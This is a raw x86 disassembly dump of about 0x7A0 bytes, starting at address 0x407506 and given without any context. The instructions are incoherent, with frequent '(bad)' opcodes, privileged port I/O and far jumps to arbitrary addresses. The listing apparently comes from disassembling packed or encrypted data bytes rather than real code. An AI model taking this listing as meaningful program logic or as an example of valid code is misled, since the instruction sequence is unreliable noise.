  407506:	jne    0x407511
  407508:	pop    ss
  407509:	xchg   edi,eax
  40750a:	push   esi
  40750b:	add    eax,0x43f44115
  407510:	into   
  407511:	stc    
  407512:	outs   dx,DWORD PTR ds:[esi]
  407513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407514:	mov    ebx,0x2503b67b
  407519:	daa    
  40751a:	in     al,0x49
  40751c:	inc    ebp
  40751d:	retw   
  40751f:	loop   0x40750e
  407521:	mov    dh,0x7a
  407523:	lahf   
  407524:	std    
  407525:	inc    eax
  407526:	lahf   
  407527:	mov    ah,0xee
  407529:	xor    al,0x31
  40752b:	lock test al,0x71
  40752e:	lahf   
  40752f:	(bad)  
  407530:	neg    BYTE PTR [edi+0x11]
  407533:	sbb    BYTE PTR [edx+ecx*4+0x2],dl
  407537:	enter  0x7322,0x73
  40753b:	in     al,0xee
  40753d:	adc    al,0xec
  40753f:	int    0x7b
  407541:	add    DWORD PTR [esi+0x27573e4f],ebx
  407547:	std    
  407548:	jge    0x407533
  40754a:	loop   0x407511
  40754c:	xchg   edx,eax
  40754d:	inc    esp
  40754e:	or     BYTE PTR es:[esi+ebx*2+0x18],ch
  407553:	fsubr  DWORD PTR [edi+eiz*2-0x13]
  407557:	ins    DWORD PTR es:[edi],dx
  407558:	pop    ds
  407559:	mov    BYTE PTR [ecx-0x18],al
  40755c:	add    DWORD PTR [ecx],ecx
  40755e:	and    esi,DWORD PTR [edi-0x5e]
  407561:	jns    0x4074fb
  407563:	adc    BYTE PTR [ebp-0x28c3dcfa],0x46
  40756a:	(bad)  
  40756b:	gs std 
  40756d:	cmp    al,0x2c
  40756f:	mov    ch,0xa8
  407571:	mov    ch,0x13
  407573:	in     al,dx
  407574:	add    DWORD PTR [ebx+ebp*2],ebp
  407577:	mov    edx,0x7bf154e8
  40757c:	int3   
  40757d:	jbe    0x40753a
  40757f:	mov    ebp,0x7b47b126
  407584:	mov    bl,0x74
  407586:	xchg   ecx,eax
  407587:	into   
  407588:	mov    eax,0x63a0b4b5
  40758d:	xchg   edi,eax
  40758e:	cmp    dl,BYTE PTR [ebx-0x41e72bcc]
  407594:	push   ebp
  407595:	mov    ds:0x330acf84,al
  40759a:	daa    
  40759b:	xor    al,BYTE PTR ds:0x7cb5f918
  4075a1:	adc    BYTE PTR [esp+ecx*8],dh
  4075a4:	xor    DWORD PTR [edx+edi*2],ecx
  4075a7:	sbb    BYTE PTR [esi],0x3c
  4075aa:	cld    
  4075ab:	and    DWORD PTR [edx-0x5e],0x57
  4075af:	sbb    ecx,DWORD PTR [esi+0xc]
  4075b2:	sar    esp,1
  4075b4:	mov    bl,0x77
  4075b6:	cmp    al,0x8f
  4075b8:	sbb    eax,0x5b0f75f
  4075bd:	jg     0x40760d
  4075bf:	bound  edx,QWORD PTR [edi]
  4075c1:	push   ss
  4075c2:	arpl   WORD PTR [edi],si
  4075c4:	in     al,0x50
  4075c6:	(bad)  
  4075c7:	jle    0x4075fa
  4075c9:	mov    ecx,0xba9b2099
  4075ce:	dec    edi
  4075cf:	push   esp
  4075d0:	sub    ecx,0xffffffae
  4075d3:	mov    cl,0x71
  4075d5:	jl     0x40757f
  4075d7:	push   esi
  4075d8:	cwde   
  4075d9:	mov    esp,0xcc223f45
  4075de:	xor    al,0x28
  4075e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075e1:	xor    dh,dh
  4075e3:	adc    edx,eax
  4075e5:	or     DWORD PTR [ebx-0x3a],edx
  4075e8:	push   ebp
  4075e9:	push   edx
  4075ea:	dec    ebx
  4075eb:	outs   dx,DWORD PTR ds:[esi]
  4075ec:	enter  0x3e25,0x29
  4075f0:	inc    ebp
  4075f1:	or     eax,0x8123e33
  4075f6:	frstor [ebp+0x7]
  4075f9:	inc    edi
  4075fa:	stos   BYTE PTR es:[edi],al
  4075fb:	imul   edi,DWORD PTR [ecx-0x13],0x590f69b8
  407602:	push   edi
  407603:	rcl    ebx,0x77
  407606:	mov    cl,0x14
  407608:	inc    ebx
  407609:	mov    esp,0x58e0a868
  40760e:	push   esp
  40760f:	mov    ds:0x5dd68383,eax
  407614:	int3   
  407615:	pop    ss
  407616:	jae    0x4075a7
  407618:	add    BYTE PTR [ecx-0x70],dh
  40761b:	sub    al,0x7
  40761d:	jb     0x4075e0
  40761f:	mov    esp,0x61600b9c
  407624:	imul   ebp,DWORD PTR [ebx],0xf818f377
  40762a:	sub    edx,esi
  40762c:	jge    0x407615
  40762e:	dec    edx
  40762f:	aaa    
  407630:	mov    ah,0xe
  407632:	jns    0x4075f5
  407634:	ins    BYTE PTR es:[edi],dx
  407635:	cs (bad) 
  407637:	repz inc esp
  407639:	pop    ds
  40763a:	fstp   DWORD PTR [ecx+0x28]
  40763d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40763e:	leave  
  40763f:	xchg   ebx,eax
  407640:	sbb    BYTE PTR es:[edx+0x29858a0e],al
  407647:	jg     0x4075f5
  407649:	shld   DWORD PTR [eax+ebx*4+0x1433e123],eax,0xf3
  407652:	xor    bh,BYTE PTR [edx+0x64e2bb53]
  407658:	sub    eax,DWORD PTR [edx]
  40765a:	shl    BYTE PTR ds:[ebx+0x13bb2126],cl
  407661:	sub    ecx,ebp
  407663:	aad    0x81
  407665:	lahf   
  407666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407667:	dec    ebp
  407668:	adc    DWORD PTR [ebx],esi
  40766a:	ja     0x4076b5
  40766c:	inc    esi
  40766d:	daa    
  40766e:	jne    0x4075f4
  407670:	cmp    esp,DWORD PTR [ecx+0xcd6ba32]
  407676:	shl    BYTE PTR [edx+0x8527028],0xf8
  40767d:	into   
  40767e:	aaa    
  40767f:	daa    
  407680:	addr16 inc esi
  407682:	sbb    eax,0xad2c0cc9
  407687:	call   FWORD PTR [ecx]
  407689:	aam    0xa8
  40768b:	or     ecx,DWORD PTR [edi-0x32c42c57]
  407691:	outs   dx,DWORD PTR ds:[esi]
  407692:	in     eax,0xb2
  407694:	repz and al,0x7d
  407697:	dec    ebp
  407698:	push   0x540345b
  40769d:	pop    DWORD PTR [edx+0x62484195]
  4076a3:	fimul  WORD PTR [eax+0x37b03c]
  4076a9:	mov    esi,0x9e5c8d3f
  4076ae:	mov    al,BYTE PTR [eax-0x5bb0fbd1]
  4076b4:	js     0x4076ae
  4076b6:	pop    es
  4076b7:	pop    edx
  4076b8:	cli    
  4076b9:	inc    edi
  4076ba:	add    al,0x86
  4076bc:	popf   
  4076bd:	stos   BYTE PTR es:[edi],al
  4076be:	or     BYTE PTR [ebx-0x63],bh
  4076c1:	sub    ah,BYTE PTR [ecx-0x1]
  4076c4:	popa   
  4076c5:	inc    edx
  4076c6:	inc    esp
  4076c7:	imul   esp,edi,0x43
  4076ca:	add    DWORD PTR [ecx],ebp
  4076cc:	mov    dl,0x6d
  4076ce:	xor    cl,BYTE PTR [ebx]
  4076d0:	xchg   esi,eax
  4076d1:	leave  
  4076d2:	xchg   esp,eax
  4076d3:	cmp    DWORD PTR [edx+eiz*1+0x30],ecx
  4076d7:	pop    ss
  4076d8:	xor    bl,bh
  4076da:	dec    eax
  4076db:	repz push ebx
  4076dd:	js     0x407669
  4076df:	pop    ebp
  4076e0:	cwde   
  4076e1:	cmp    DWORD PTR [edx-0x3793dd7c],0x9e0433e8
  4076eb:	xchg   ebx,eax
  4076ec:	call   0xf400:0x4d361643
  4076f3:	in     eax,dx
  4076f4:	mov    cl,bl
  4076f6:	xchg   ebp,eax
  4076f7:	neg    DWORD PTR [esi+eax*8]
  4076fa:	inc    ebp
  4076fb:	inc    eax
  4076fc:	fimul  WORD PTR [ecx]
  4076fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076ff:	add    BYTE PTR [ebx-0x5d334366],ah
  407705:	in     al,dx
  407706:	adc    al,0xe8
  407708:	es sti 
  40770a:	pop    ds
  40770b:	dec    edi
  40770c:	push   0xffffffac
  40770e:	not    esp
  407710:	ja     0x4076c3
  407712:	je     0x40769e
  407714:	dec    ecx
  407715:	or     al,ch
  407717:	adc    DWORD PTR [eax+0x5af8ff30],eax
  40771d:	sbb    bl,BYTE PTR [ecx+0x3d]
  407720:	adc    cl,dh
  407722:	das    
  407723:	or     eax,0xae85a5aa
  407728:	fist   DWORD PTR [eax+0x1c]
  40772b:	inc    eax
  40772c:	sbb    eax,0xf35383d2
  407731:	(bad)  
  407732:	mov    BYTE PTR [ebp-0x9],ch
  407735:	imul   edx,DWORD PTR [edx-0x5099a8bd],0x2e21f4e7
  40773f:	sti    
  407740:	inc    eax
  407741:	jae    0x40775a
  407743:	stos   BYTE PTR es:[edi],al
  407744:	pop    es
  407745:	test   al,0xb2
  407747:	mov    ds:0xda4e8fd2,eax
  40774c:	jmp    FWORD PTR [eax-0x38f03d4a]
  407752:	mov    ds:0x9c2aa972,al
  407757:	xchg   ecx,eax
  407758:	clc    
  407759:	cmp    eax,0x57299eb9
  40775e:	cli    
  40775f:	ret    0xcfe3
  407762:	lods   eax,DWORD PTR ds:[esi]
  407763:	dec    esp
  407764:	js     0x4077b0
  407766:	clc    
  407767:	scas   al,BYTE PTR es:[edi]
  407768:	sub    BYTE PTR [esi-0x6068cffb],ah
  40776e:	ins    DWORD PTR es:[edi],dx
  40776f:	cmp    BYTE PTR [ebp+0x63337ac3],dh
  407775:	fdivr  QWORD PTR [edi]
  407777:	push   edx
  407778:	rol    DWORD PTR [ebp-0x74],cl
  40777b:	adc    eax,DWORD PTR [ebx+0xfe4f11d]
  407781:	or     BYTE PTR [ecx],al
  407783:	mov    eax,DWORD PTR [ecx-0x418860d6]
  407789:	cli    
  40778a:	leave  
  40778b:	sti    
  40778c:	mov    WORD PTR [esi],fs
  40778e:	addr16 mov ss:0x5094,eax
  407793:	or     BYTE PTR [ecx+0x1912c571],bl
  407799:	cmp    DWORD PTR [edi],esi
  40779b:	sbb    BYTE PTR [eax],bl
  40779d:	push   ss
  40779e:	dec    ebx
  40779f:	push   edi
  4077a0:	push   eax
  4077a1:	repnz call 0x12f:0xa569
  4077a8:	std    
  4077a9:	scas   eax,DWORD PTR es:[edi]
  4077aa:	fwait
  4077ab:	(bad)  
  4077ac:	xchg   edi,eax
  4077ad:	sar    DWORD PTR [ebx],1
  4077af:	mov    dh,0x48
  4077b1:	adc    bh,dl
  4077b3:	rol    DWORD PTR [esi-0xf1950ae],1
  4077b9:	xor    ebp,edx
  4077bb:	cwde   
  4077bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077bd:	pop    eax
  4077be:	dec    eax
  4077bf:	inc    edx
  4077c0:	inc    edi
  4077c1:	jno    0x407772
  4077c3:	jns    0x40780c
  4077c5:	or     dl,0xe7
  4077c8:	add    eax,0xcd346a7d
  4077cd:	aaa    
  4077ce:	fst    DWORD PTR [ebx]
  4077d0:	out    dx,al
  4077d1:	dec    edx
  4077d2:	dec    si
  4077d4:	sub    ah,ah
  4077d6:	xchg   ebx,eax
  4077d7:	cmp    esp,DWORD PTR [eax]
  4077d9:	push   edx
  4077da:	add    ah,ch
  4077dc:	addr16 imul eax,edi,0xd
  4077e0:	push   0xffffffaf
  4077e2:	test   BYTE PTR [esi+eax*2-0x7c40e43c],dh
  4077e9:	xchg   esp,eax
  4077ea:	inc    ebp
  4077eb:	or     BYTE PTR [eax+0x458ef5b7],dl
  4077f1:	add    DWORD PTR [edi+0x2d],eax
  4077f4:	sbb    edi,eax
  4077f6:	xlat   BYTE PTR ds:[ebx]
  4077f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f8:	and    DWORD PTR [eax+0x17ceaac4],esi
  4077fe:	sbb    bl,0x26
  407801:	or     edx,esi
  407803:	sahf   
  407804:	pop    edx
  407805:	xor    eax,0xf0f72470
  40780a:	call   0xa8b92a79
  40780f:	psubsb mm1,QWORD PTR [esi]
  407812:	dec    ecx
  407813:	dec    edx
  407814:	mov    al,ds:0xb6b5332e
  407819:	in     al,0x52
  40781b:	adc    edi,DWORD PTR [edi+0x5576c2c8]
  407821:	mov    ds:0xe7be00bf,al
  407826:	in     al,0x13
  407828:	dec    edx
  407829:	ds (bad) 
  40782b:	sar    BYTE PTR [edx+0x3fbf0b41],1
  407831:	stc    
  407832:	int3   
  407833:	and    ecx,DWORD PTR [edi]
  407835:	std    
  407836:	inc    ecx
  407837:	test   DWORD PTR [ecx],ecx
  407839:	sub    DWORD PTR gs:[ebx],ebx
  40783c:	or     bl,BYTE PTR [ebp-0x80]
  40783f:	std    
  407840:	sub    edx,DWORD PTR [ebp-0x6e]
  407843:	in     al,0xab
  407845:	loope  0x4078b3
  407847:	and    BYTE PTR [edx-0x6420ce85],bh
  40784d:	sub    BYTE PTR [ebp-0xb619110],ah
  407853:	lahf   
  407854:	xchg   ecx,eax
  407855:	aaa    
  407856:	mov    al,ds:0x8334f8fb
  40785b:	(bad)  
  40785d:	inc    eax
  40785e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40785f:	js     0x4077ec
  407861:	les    esi,FWORD PTR [ebp+0x45]
  407864:	repnz sbb DWORD PTR [esi+edx*4],ecx
  407868:	sahf   
  407869:	mov    edi,DWORD PTR [eax]
  40786b:	mov    ebx,0xee0a5006
  407870:	dec    ebp
  407871:	out    dx,eax
  407872:	mov    ds,WORD PTR [ebp-0x44888e2c]
  407878:	dec    eax
  407879:	adc    ebx,DWORD PTR [esi]
  40787b:	int    0x3c
  40787d:	mov    eax,0x480f59f
  407882:	mov    ah,0xb8
  407884:	mov    edi,0xb729a60f
  40788a:	sbb    DWORD PTR [edx+0x1b],edi
  40788d:	cmp    edi,eax
  40788f:	adc    DWORD PTR [esi-0x77],ebp
  407892:	inc    ebp
  407893:	sbb    ah,BYTE PTR [ebp-0x22]
  407896:	les    eax,FWORD PTR [edx+0x3b]
  407899:	mov    ds:0xa1e6a6b0,al
  40789e:	cmc    
  40789f:	outs   dx,DWORD PTR ds:[esi]
  4078a0:	psllw  mm4,QWORD PTR [edi]
  4078a3:	pop    es
  4078a4:	test   bh,dl
  4078a6:	gs push esi
  4078a8:	sbb    cl,BYTE PTR [esi+eax*2-0x3661da52]
  4078af:	imul   esp,DWORD PTR [edx+0x5144f4ef],0xffffffce
  4078b6:	(bad)
  4078b9:	outs   dx,DWORD PTR ds:[esi]
  4078ba:	retf   0xebc1
  4078bd:	pop    es
  4078be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078bf:	dec    esp
  4078c0:	nop
  4078c1:	or     dl,BYTE PTR [ebp-0x273417e]
  4078c7:	dec    ecx
  4078c8:	mov    WORD PTR [ebp-0xf],?
  4078cb:	inc    ecx
  4078cc:	hlt    
  4078cd:	add    eax,0xc52154f4
  4078d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078d3:	lods   al,BYTE PTR ds:[esi]
  4078d5:	inc    eax
  4078d6:	clc    
  4078d7:	adc    al,BYTE PTR [eax+0x29]
  4078da:	push   ss
  4078db:	cmp    BYTE PTR [ebx-0x18],bh
  4078de:	(bad)  
  4078df:	out    dx,eax
  4078e0:	stc    
  4078e1:	aas    
  4078e2:	sub    bl,BYTE PTR [esi+0x95f0eee]
  4078e8:	lods   eax,DWORD PTR ds:[esi]
  4078e9:	dec    ebp
  4078ea:	jmp    0x4078da
  4078ec:	sbb    edx,eax
  4078ee:	xor    ah,BYTE PTR [esi+0x22e70da2]
  4078f4:	retf   
  4078f5:	leave  
  4078f6:	(bad)
  4078f9:	data16 xor BYTE PTR [ecx],dh
  4078fc:	and    DWORD PTR [eax-0x794736f2],edx
  407902:	mov    esp,0xbd5db60a
  407907:	fs gs pop ss
  40790a:	lock mov al,ds:0x5fffe334
  407910:	sbb    ebp,DWORD PTR [edx+edi*8+0x37]
  407914:	xchg   edx,eax
  407915:	dec    edx
  407916:	es stos DWORD PTR es:[edi],eax
  407918:	pop    esi
  407919:	inc    ebp
  40791a:	sub    eax,DWORD PTR [ecx+0x15428a9c]
  407920:	jmp    0x4078d9
  407922:	outs   dx,DWORD PTR ds:[esi]
  407923:	mov    DWORD PTR [ecx+0x21b64af],ebp
  407929:	mov    ebx,0x7f7ac4af
  40792e:	out    dx,al
  40792f:	pop    edx
  407930:	adc    dh,BYTE PTR [ebx-0x2c]
  407933:	into   
  407934:	pop    esi
  407935:	mov    ah,0x7a
  407937:	test   al,0xa7
  407939:	sub    eax,0x1668da8e
  40793e:	jbe    0x4078ec
  407940:	sar    DWORD PTR [ebx-0x68],0x7d
  407944:	imul   DWORD PTR [ecx-0x10]
  407947:	lea    ebp,[ecx*4-0x2ea47e7a]
  40794e:	sub    ch,dh
  407950:	and    DWORD PTR [edx+0x35049122],edi
  407956:	in     eax,0xd0
  407958:	xchg   ebx,eax
  407959:	fwait
  40795a:	addr16 mov ecx,0xd0636af9
  407960:	repz dec esp
  407962:	xor    eax,0xc4a70998
  407967:	sbb    eax,DWORD PTR [eax-0x28]
  40796a:	ds mov al,0x87
  40796d:	scas   al,BYTE PTR es:[edi]
  40796e:	ds cdq 
  407970:	mov    cl,0x1
  407972:	cld    
  407973:	dec    ebx
  407974:	and    al,0x3d
  407976:	xchg   ebp,eax
  407977:	dec    esi
  407978:	sub    BYTE PTR [esi-0x65],dl
  40797b:	xchg   ecx,eax
  40797c:	scas   al,BYTE PTR es:[edi]
  40797d:	cmp    al,0xbe
  40797f:	stos   DWORD PTR es:[edi],eax
  407980:	stos   DWORD PTR es:[edi],eax
  407981:	jno    0x4079f8
  407983:	add    bl,BYTE PTR [edi]
  407985:	push   0xffffff8e
  407987:	jecxz  0x4079a9
  407989:	or     eax,0xab90c9dc
  40798e:	or     BYTE PTR [esi-0x5661434b],ch
  407994:	outs   dx,DWORD PTR ds:[esi]
  407995:	sub    BYTE PTR [ecx+0x4a],dh
  407998:	fwait
  407999:	aam    0xef
  40799b:	mov    BYTE PTR [ecx],bl
  40799d:	push   cs
  40799e:	push   cs
  40799f:	scas   eax,DWORD PTR es:[edi]
  4079a0:	std    
  4079a1:	nop
  4079a2:	lods   eax,DWORD PTR ds:[esi]
  4079a3:	cmp    BYTE PTR [eax-0xf],0x6
  4079a7:	mov    esp,0x71f72203
  4079ac:	daa    
  4079ad:	out    dx,al
  4079ae:	sar    ebp,0x27
  4079b1:	lahf   
  4079b2:	call   0xf74b:0x4deadf26
  4079b9:	or     BYTE PTR [edx-0x4b],bl
  4079bc:	add    BYTE PTR [ebx],cl
  4079be:	repz jmp 0xaf94ca3a
  4079c4:	mov    ecx,0x21f1a699
  4079c9:	bnd jnp 0x407a43
  4079cc:	mov    ecx,0xf0b4f9db
  4079d1:	sub    bh,BYTE PTR [edi]
  4079d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079d4:	les    edi,FWORD PTR [ebx-0x220ebddc]
  4079da:	and    ebx,DWORD PTR [ecx+0x300ea46d]
  4079e0:	test   al,0xc3
  4079e2:	ja     0x4079b2
  4079e4:	cmp    esp,edi
  4079e6:	or     eax,0xdaed87
  4079eb:	jne    0x407a41
  4079ed:	xor    eax,edx
  4079ef:	int3   
  4079f0:	push   eax
  4079f1:	retf   0x1edc
  4079f4:	in     eax,dx
  4079f5:	std    
  4079f6:	int3   
  4079f7:	and    BYTE PTR [edi+0x24],bh
  4079fa:	cdq    
  4079fb:	and    BYTE PTR [edi],0x80
  4079fe:	cmc    
  4079ff:	sub    eax,0x3d936f
  407a04:	sub    BYTE PTR [ebx],0x40
  407a07:	and    ebx,esp
  407a09:	fs jmp 0x407a12
  407a0c:	xor    eax,0xbfeb6d8b
  407a11:	jp     0x4079ed
  407a13:	cmp    eax,0x5928c96b
  407a18:	mov    bl,0x15
  407a1a:	rol    BYTE PTR [ecx+ebx*8+0x1b],1
  407a1e:	in     al,0xbc
  407a20:	fdiv   QWORD PTR [edi]
  407a22:	out    dx,al
  407a23:	fdiv   QWORD PTR [edx+edx*8]
  407a26:	push   0xfabdf682
  407a2b:	adc    edi,ecx
  407a2d:	lods   al,BYTE PTR ds:[esi]
  407a2e:	xchg   ebp,eax
  407a2f:	push   edi
  407a30:	sbb    DWORD PTR [ebx],0xc59ac65
  407a36:	push   ds
  407a37:	inc    ebp
  407a38:	cmc    
  407a39:	mov    ebx,0x629f3f86
  407a3e:	push   es
  407a3f:	scas   eax,DWORD PTR es:[edi]
  407a40:	adc    eax,0x29293e1a
  407a45:	jae    0x407a54
  407a47:	push   ds
  407a48:	pusha  
  407a49:	hlt    
  407a4a:	lea    ecx,[esi-0x4d5f0e37]
  407a50:	and    BYTE PTR [eax+0x2f],bl
  407a53:	loopne 0x407a53
  407a55:	neg    esi
  407a57:	cmp    BYTE PTR [edi],dl
  407a59:	int3   
  407a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a5b:	mov    al,ds:0xa12175ed
  407a60:	push   es
  407a61:	mov    cl,0x0
  407a63:	adc    cl,BYTE PTR [ebp+0x3d6de2a4]
  407a69:	test   al,ch
  407a6b:	mov    dh,0xa8
  407a6d:	ret    0x1558
  407a70:	cmp    eax,DWORD PTR [ecx+0x251ad610]
  407a76:	adc    edx,DWORD PTR [eax-0x2d]
  407a79:	and    DWORD PTR [esi+0x3f34d1a8],0x934805bd
  407a83:	mov    ch,0x18
  407a85:	pop    eax
  407a86:	adc    eax,0x195e324
  407a8b:	inc    ebp
  407a8c:	jmp    0xeef97983
  407a91:	add    BYTE PTR [eax+0x4bc97107],0x1
  407a98:	xchg   DWORD PTR [ebp-0x24e2a02c],eax
  407a9e:	repz loope 0x407a2a
  407aa1:	sub    BYTE PTR [ebx+0x6f],dl
  407aa4:	adc    DWORD PTR [esp+edx*4-0x357ccda2],ebp
  407aab:	cmp    BYTE PTR [ebx+0x70955067],bh
  407ab1:	pushf  
  407ab2:	loope  0x407b15
  407ab4:	test   al,0x93
  407ab6:	and    al,0x7f
  407ab8:	adc    BYTE PTR [edx+0x6],cl
  407abb:	mov    DWORD PTR [ebp+0x2da8e1ab],esp
  407ac1:	add    al,0xd5
  407ac3:	cmc    
  407ac4:	push   edx
  407ac5:	xchg   DWORD PTR [ebp+0x13143e1],edi
  407acb:	jge    0x407ad7
  407acd:	pushf  
  407ace:	fsubr  DWORD PTR [edi-0x50f35bdc]
  407ad4:	inc    ebx
  407ad5:	ret    0x67f9
  407ad8:	je     0x407aa9
  407ada:	rcl    BYTE PTR [ebx+0x57],1
  407add:	pop    ds
  407ade:	inc    edi
  407adf:	push   eax
  407ae0:	int    0x25
  407ae2:	sahf   
  407ae3:	in     al,0x46
  407ae5:	popf   
  407ae6:	bound  ebx,QWORD PTR [edi]
  407ae8:	sar    edi,1
  407aea:	popa   
  407aeb:	stc    
  407aec:	mov    esp,0x47fb7fb2
  407af1:	mov    dl,0xe5
  407af3:	pushf  
  407af4:	stos   DWORD PTR es:[edi],eax
  407af5:	jns    0x407a77
  407af7:	inc    eax
  407af8:	pop    eax
  407af9:	and    DWORD PTR [edi+0x6f60d12f],ebp
  407aff:	push   ds
  407b00:	inc    esi
  407b01:	push   es
  407b02:	and    DWORD PTR [edx-0x1f],edx
  407b05:	leave  
  407b06:	fnstenv [ecx+0x30]
  407b09:	sahf   
  407b0a:	add    edx,DWORD PTR [edx+ebx*8-0x7c6df42b]
  407b11:	popf   
  407b12:	fadd   DWORD PTR [eax-0x19f200b9]
  407b18:	jmp    FWORD PTR [edx+0x6d]
  407b1b:	hlt    
  407b1c:	int    0x1d
  407b1e:	xchg   ebx,eax
  407b1f:	pop    esp
  407b20:	ror    ecx,cl
  407b22:	test   eax,0x5a750b01
  407b27:	inc    eax
  407b28:	sbb    DWORD PTR [ecx],esp
  407b2a:	lods   al,BYTE PTR ds:[esi]
  407b2b:	sbb    DWORD PTR [eax],eax
  407b2d:	sbb    BYTE PTR [eax+0x6b38abb8],bh
  407b33:	cld    
  407b34:	loope  0x407b32
  407b36:	pusha  
  407b37:	adc    dl,BYTE PTR [edx+0x5f]
  407b3a:	mov    al,0xd0
  407b3c:	in     eax,dx
  407b3d:	xchg   edi,eax
  407b3e:	mov    ebx,0x19ea87b6
  407b43:	icebp  
  407b44:	sbb    eax,0x2efe2ff8
  407b49:	outs   dx,BYTE PTR ds:[esi]
  407b4a:	ret    
  407b4b:	push   0x810f995d
  407b50:	jp     0x407bbd
  407b52:	loopne 0x407b6f
  407b54:	fsubr  DWORD PTR [ebx-0x21629c72]
  407b5a:	daa    
  407b5b:	add    dl,BYTE PTR [edx+0x45]
  407b5e:	push   es
  407b5f:	xchg   BYTE PTR [esi+0x39d78f2a],cl
  407b65:	pop    ss
  407b66:	(bad)  
  407b67:	dec    ecx
  407b68:	jne    0x407b8a
  407b6a:	pop    ebp
  407b6b:	scas   eax,DWORD PTR es:[edi]
  407b6c:	add    cl,dh
  407b6e:	xchg   edx,edi
  407b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b71:	mov    ah,0x63
  407b73:	ret    
  407b74:	test   al,0xdb
  407b77:	(bad)  
  407b78:	jmp    0x5e5e913f
  407b7d:	xor    al,0xfc
  407b7f:	inc    ebp
  407b80:	xchg   ebp,eax
  407b81:	sbb    esp,0xffffff89
  407b84:	ins    DWORD PTR es:[edi],dx
  407b85:	or     eax,0xfd67c262
  407b8a:	pop    ecx
  407b8b:	inc    esp
  407b8c:	gs repz inc edi
  407b8f:	mov    esi,0x11a3fbee
  407b94:	pop    eax
  407b95:	(bad)  
  407b96:	in     al,dx
  407b97:	mov    eax,ds:0xed893ca5
  407b9c:	jmp    0xec2dfce4
  407ba1:	in     eax,dx
  407ba2:	(bad)  
  407ba3:	dec    ebp
  407ba4:	cmp    BYTE PTR [eax],bl
  407ba6:	enter  0xca89,0xa2
  407baa:	in     eax,dx
  407bab:	inc    esp
  407bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bad:	add    BYTE PTR [eax],cl
  407baf:	dec    edi
  407bb0:	repnz sub DWORD PTR [eax],edx
  407bb3:	loop   0x407b3e
  407bb5:	mov    ?,WORD PTR [eax+0x15d4c047]
  407bbb:	pop    edx
  407bbc:	(bad)  
  407bbd:	ins    BYTE PTR es:[edi],dx
  407bbe:	push   ss
  407bbf:	daa    
  407bc0:	cmc    
  407bc1:	bound  ebp,QWORD PTR [ecx]
  407bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc4:	mov    cl,0xbb
  407bc6:	dec    esi
  407bc7:	sbb    ebx,DWORD PTR [eax+eax*8-0x30]
  407bcb:	fst    DWORD PTR [esi+eax*8-0x31bdec7d]
  407bd2:	icebp  
  407bd3:	mov    ecx,0xf694a465
  407bd8:	(bad)
  407bdd:	loop   0x407bfa
  407bdf:	popf   
  407be0:	in     eax,0x68
  407be2:	add    BYTE PTR [edi-0x77],cl
  407be5:	mov    dl,0xa0
  407be7:	cmovl  si,WORD PTR [ecx+0x48]
  407bec:	sbb    al,0xf1
  407bee:	aaa    
  407bef:	and    ebp,edi
  407bf1:	sbb    DWORD PTR [eax],0xffffffb3
  407bf4:	fadd   QWORD PTR [eax+0x65]
  407bf7:	call   0xa443d3a9
  407bfc:	iret   
  407bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bfe:	arpl   WORD PTR [ebp+ebp*8-0x418ccd24],bx
  407c05:	xchg   edi,eax
  407c06:	inc    esi
  407c07:	xchg   edi,eax
  407c08:	out    0xea,al
  407c0a:	retf   
  407c0b:	or     eax,0xc2fd62f4
  407c10:	and    DWORD PTR [eax],0xbbfbfb59
  407c16:	jmp    0x2f88c9ad
  407c1b:	sbb    al,0xcc
  407c1d:	fxtract 
  407c1f:	sbb    ch,bl
  407c21:	mov    ecx,0x58eff759
  407c26:	fld    st(2)
  407c28:	sub    ecx,DWORD PTR [esi+0x7d422c80]
  407c2e:	mov    edx,0xde0de79d
  407c33:	fcmovnb st,st(5)
  407c35:	test   al,bl
  407c37:	inc    ecx
  407c38:	mov    edx,0x12cac7c0
  407c3d:	imul   eax,ebx,0x83ca4fa8
  407c43:	lods   eax,DWORD PTR ds:[esi]
  407c44:	loope  0x407c7e
  407c46:	mov    ebp,0x207946b0
  407c4b:	test   BYTE PTR ds:0x4cc90bad,ch
  407c51:	and    ebx,esp
  407c53:	xchg   edi,eax
  407c54:	or     DWORD PTR [ecx],ecx
  407c56:	ins    BYTE PTR es:[edi],dx
  407c57:	cld    
  407c58:	loop   0x407c6e
  407c5a:	mov    esp,0x4258b6f0
  407c5f:	leave  
  407c60:	xchg   bh,bh
  407c62:	popf   
  407c63:	scas   al,BYTE PTR es:[edi]
  407c64:	outs   dx,DWORD PTR ds:[esi]
  407c65:	adc    BYTE PTR [edx-0x5a],0x97
  407c69:	adc    ecx,DWORD PTR [ecx-0x49]
  407c6c:	int    0x46
  407c6e:	shl    BYTE PTR [edx],0x10
  407c71:	rcl    DWORD PTR [ebp+0x418cb282],1
  407c77:	sti    
  407c78:	adc    dl,bl
  407c7a:	leave  
  407c7b:	jle    0x407c39
  407c7d:	mov    bh,0xa6
  407c7f:	shl    DWORD PTR ds:0x9a9ef7f3,cl
  407c85:	sahf   
  407c86:	cdq    
  407c87:	cli    
  407c88:	push   ebp
  407c89:	sbb    al,0xb9
  407c8b:	retf   0x5fb9
  407c8e:	xor    ah,BYTE PTR [eax+0x175f6e79]
  407c94:	cld    
  407c95:	xor    al,0xfa
  407c97:	cli    
  407c98:	mov    al,0xa7
  407c9a:	mov    cl,0xa9
  407c9c:	cmp    al,0xb5
  407c9e:	jmp    0x407c60
  407ca0:	mov    ah,0x72
  407ca2:	stc    
  407ca3:	inc    esp
  407ca4:	jbe    0x407cee
  407ca6:	push   cs
  407ca7:	retf   0x7e79
